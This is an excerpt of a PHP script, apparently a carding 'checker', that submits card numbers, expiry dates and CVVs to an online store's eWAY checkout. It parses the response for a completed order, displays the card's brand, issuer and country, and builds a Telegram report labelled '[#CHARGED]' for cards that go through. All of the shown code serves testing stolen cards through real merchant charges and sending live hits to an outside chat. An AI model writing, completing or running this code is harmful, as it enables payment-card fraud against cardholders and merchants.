...
$paymentMethods = [
    ...
    'eway_payments' => '/<input[^>]*name="payment_method"[^>]*value="eway_payments"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'eway_payments-card-number' => $cc,
    'eway_payments-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'eway_payments-card-cvc' =>  $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED EWAY_PAYMENTS]
    \n[$hostname1]
    \n[$receiptUrl]\n";
